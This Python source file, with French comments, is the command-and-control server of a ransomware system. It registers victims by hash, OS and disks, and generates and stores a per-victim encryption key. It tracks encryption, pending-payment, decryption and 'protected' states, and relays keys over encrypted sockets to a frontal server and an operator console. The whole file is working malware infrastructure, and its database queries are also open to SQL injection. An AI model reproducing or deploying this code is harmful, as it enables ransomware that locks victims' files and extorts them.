import datetime
import time
import utile.network as network
import utile.message as message
import utile.data as data
import utile.security as security
import queue
import threading

main_queue = queue.Queue()
front_thread_queue = queue.Queue()
console_thread_queue = queue.Queue()


def get_data_from_db(message_console, conn):
    global console_thread_queue
    global front_thread_queue
    global main_queue
    type_message = message.get_message_type(message_console)
    print("Type de message reçu : ", type_message)

    # Traiter le message reçu de type LIST_REQ
    if type_message == "LIST_REQ":
        victims = data.get_list_victims(conn)
        # Envoi de la réponse de type LIST_VICTIM_RESP (pour chaque victime)
        for victim in victims:
            message_response = message.set_message("LIST_RESP", victim)
            # STOCKAGE DANS LA QUEUE DU THREAD DE CONSOLE
            console_thread_queue.put(message_response)
        # Envoi de la réponse de type LIST_VICTIM_END
        console_thread_queue.put(message.set_message("LIST_END"))
        # print la queue du thread de console
        print(console_thread_queue.queue)

    # Traiter le message reçu de type HIST_REQ
    elif type_message == "HIST_REQ":
        victim_id = message_console["HIST_REQ"]
        print(victim_id)
        # Récupérer l'historique en fonction de l'id de la victime
        history = data.get_list_history(conn, victim_id)
        # Envoi de la réponse de type HISTORY_RESP (pour chaque élément de l'historique)
        for hist in history:
            console_thread_queue.put(message.set_message("HIST_RESP", hist))
        # Envoi de la réponse de type HISTORY_END
        console_thread_queue.put(message.set_message("HIST_END"))
        print(list(console_thread_queue.queue))

    # Traiter le message reçu de type CHGSTATE
    elif type_message == "CHGSTATE":
        print(message_console)
        victim_id = message_console["CHGSTATE"]
        if message_console["STATE"] == "CRYPT":
            victim_id = data.select_data(conn, f"SELECT id_victim FROM victims WHERE hash = '{victim_id}'")[0][0]
            items = ["id_states", "id_victim", "datetime", "state"]
            contenu = [2, victim_id, datetime.datetime.now().timestamp(), "CRYPT"]
            data.insert_data(conn, "states", items, contenu)
        print(victim_id)

    elif type_message == "INITIALIZE":
        handle_initialize(message_console, conn)

    elif type_message == "PENDING_SIGNAL":
        handle_pending_signal(message_console, conn)

    elif type_message == "DECRYPT":
        handle_decrypt(message_console, conn)

    elif type_message == "PROTECTREQ":
        handle_protectreq(message_console, conn)


def handle_initialize(message_console, conn):
    select_query = "SELECT hash, key FROM victims;"
    victims = data.select_data(conn, select_query)
    hash_victim = message_console["INITIALIZE"]
    print(hash_victim)
    found = False

    for victim in victims:
        if hash_victim == victim[0]:
            history = data.get_list_history(conn, victim[2])
            params = [victim[0], victim[1], history[-1][3]]
            message_response = message.set_message("KEY_RESP", params)
            front_thread_queue.put(message_response)
            found = True
            break

    if not found:
        key = security.gen_key(512)
        items_victim = ["id_victim", "os", "hash", "disks", "key"]
        contenu_victim = [len(victims) + 1, message_console["OS"], hash_victim, str(message_console["DISKS"]), key]
        data.insert_data(conn, "victims", items_victim, contenu_victim)
        print(contenu_victim)
        items_state = ["id_states", "id_victim", "datetime", "state"]
        print(items_state)
        contenu_state = [1, len(victims) + 1, datetime.datetime.now().timestamp(), "INITIALIZE"]
        data.insert_data(conn, "states", items_state, contenu_state)
        front_thread_queue.put(message.set_message("KEY_RESP", [hash_victim, key, "INITIALIZE"]))


def handle_pending_signal(message_console, conn):
    victim_hash = message_console["PENDING_SIGNAL"]
    victim_id = data.select_data(conn, f"SELECT id_victim FROM victims WHERE hash = '{victim_hash}'")[0][0]
    actual_state = data.get_list_history(conn, victim_id)[-1][3]

    if actual_state == "PENDING":
        console_thread_queue.put(message.set_message("PENDING_SIGNAL", ["PENDING"]))
        items_encrypted = ["id_victim", "nb_files"]
        contenu_encrypted = [victim_id, message_console["NB_FILES"]]
        data.insert_data(conn, "encrypted", items_encrypted, contenu_encrypted)
    elif actual_state == "DECRYPT":
        nb_files_encrypt = data.select_data(conn, f"SELECT nb_files FROM encrypted WHERE id_victim = {victim_id}")[0][0]
        key_victim = data.select_data(conn, f"SELECT key FROM victims WHERE id_victim = {victim_id}")[0][0]
        front_thread_queue.put(message.set_message("DECRYPT", [victim_hash, nb_files_encrypt, key_victim]))
    else:
        items = ["id_states", "id_victim", "datetime", "state"]
        contenu = [3, victim_id, datetime.datetime.now().timestamp(), "PENDING"]
        data.insert_data(conn, "states", items, contenu)
        items_encrypted = ["id_victim", "datetime", "nb_files"]
        contenu_encrypted = [victim_id, datetime.datetime.now().timestamp(), message_console["NB_FILES"]]
        data.insert_data(conn, "encrypted", items_encrypted, contenu_encrypted)


def handle_decrypt(message_console, conn):
    victim_id = message_console["DECRYPT"]
    print(victim_id)
    victim_hash = data.select_data(conn, f"SELECT hash FROM victims WHERE id_victim = '{victim_id}'")[0][0]
    print(victim_hash)
    nb_files_encrypt = data.select_data(conn, f"SELECT nb_files FROM encrypted WHERE id_victim = {victim_id}")[0][0]
    key_victim = data.select_data(conn, f"SELECT key FROM victims WHERE id_victim = {victim_id}")[0][0]
    front_thread_queue.put(message.set_message("DECRYPT", [victim_hash, nb_files_encrypt, key_victim]))
    data.insert_data(conn, "states", ["id_states", "id_victim", "datetime", "state"],
                     [4, victim_id, datetime.datetime.now().timestamp(), "DECRYPT"])


def handle_protectreq(message_console, conn):
    victim_id = data.select_data(conn, f"SELECT id_victim FROM victims WHERE hash = '{message_console['PROTECTREQ']}'")[0][0]
    nb_files = data.select_data(conn, f"SELECT nb_files FROM encrypted WHERE id_victim = {victim_id}")[0][0]
    data.insert_data(conn, "states", ["id_states", "id_victim", "datetime", "state"],
                     [5, victim_id, datetime.datetime.now().timestamp(), "PROTECTED"])
    data.insert_data(conn, "decrypted", ["id_victim", "datetime", "nb_files"],
                     [victim_id, datetime.datetime.now().timestamp(), nb_files])
    front_thread_queue.put(message.set_message("COUNT", [message_console['PROTECTREQ'], nb_files]))


def handle_console(socket_server_console):
    global console_thread_queue
    global main_queue
    while True:
        client_socket, address = socket_server_console.accept()
        print(client_socket, address)
        key = security.diffie_hellman_recv_key(client_socket)
        encrypted_message_console = network.receive_message(client_socket)
        if encrypted_message_console is not None:
            message_console = security.aes_decrypt(encrypted_message_console, key)
            main_queue.put((message_console, client_socket, key))
        else:
            print("Message console reçu est None. Ignoré.")

        # Récupérer les réponses de la file d'attente console_thread_queue et les renvoyer à la console de contrôle
        while console_thread_queue.empty():
            pass
        # Récupérer les messages de la file d'attente (un oar un) jusqu'au list_end ou hist_end et les envoyer à la console
        while not console_thread_queue.empty():
            message_console = console_thread_queue.get()
            print("Message à envoyer à la console:", message_console)
            encrypted_message_console = security.aes_encrypt(message_console, key)
            network.send_message(client_socket, encrypted_message_console)
            print("Message envoyé : ", message_console)

            # Si le message est de type LIST_END ou HIST_END, sortir de la boucle
            if message.get_message_type(message_console) in ["LIST_END", "HIST_END"]:
                print("Fin de liste ou d'historique détectée, sortie de la boucle.")
                break


def handle_frontal(socket_server_frontal):
    global message_frontal
    print("Frontal server started")
    client_socket, address = socket_server_frontal.accept()
    print(client_socket, address)
    key = security.diffie_hellman_recv_key(client_socket)
    while True:
        try:
            encrypted_message_frontal = network.receive_message(client_socket)
            if encrypted_message_frontal is not None:
                message_frontal = security.aes_decrypt(encrypted_message_frontal, key)
                main_queue.put((message_frontal, client_socket, key))
            else:
                print("Message frontal reçu est None. Ignoré.")
        except Exception as e:
            print("Aucun message reçu du serveur frontal : ", e)
        while front_thread_queue.empty():
            if message.get_message_type(message_frontal) == ("CHGSTATE" or "PENDING_SIGNAL"):
                break
            pass
        else:
            while not front_thread_queue.empty():
                message_front = front_thread_queue.get()
                encrypted_message_front = security.aes_encrypt(message_front, key)
                network.send_message(client_socket, encrypted_message_front)
                print("Message envoyé : ", message_front)


def main():
    socket_server_console = network.start_net_serv(port=8380)
    socket_server_frontal = network.start_net_serv(port=8381)
    conn = data.connect_db()
    if conn is not None:
        print("Base de données initialisée")

    console = threading.Thread(target=handle_console, args=(socket_server_console,))
    frontal = threading.Thread(target=handle_frontal, args=(socket_server_frontal,))

    console.start()
    frontal.start()

    while True:
        while not main_queue.empty():
            # Traiter les éléments de la file
            message_console, client_socket, key = main_queue.get()
            get_data_from_db(message_console, conn)
            time.sleep(0.01)
        time.sleep(0.01)


if __name__ == '__main__':
    main()
